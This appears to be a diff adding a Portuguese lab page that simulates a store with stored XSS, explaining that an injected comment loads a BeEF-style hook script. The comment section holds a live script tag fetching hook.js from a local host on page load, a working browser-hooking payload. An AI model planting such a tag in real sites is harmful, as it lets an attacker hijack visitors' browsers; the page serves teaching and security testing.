@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Loja vulnerável (simulação de XSS)</title>
+</head>
+<body>
+  <h1>Loja vulnerável</h1>
+  <p>Esta página simula um site com XSS armazenado: um comentário injetou o
+     <code>&lt;script src="http://127.0.0.1:8001/hook.js"&gt;</code> abaixo,
+     como faria o framework BeEF.</p>
+
+  <form>
+    <label>Busca <input name="q" placeholder="digite algo"></label>
+  </form>
+
+  <h2>Comentários</h2>
+  <div class="comentario">
+    Ótimo produto! <script src="http://127.0.0.1:8001/hook.js"></script>
+  </div>
+</body>
+</html>
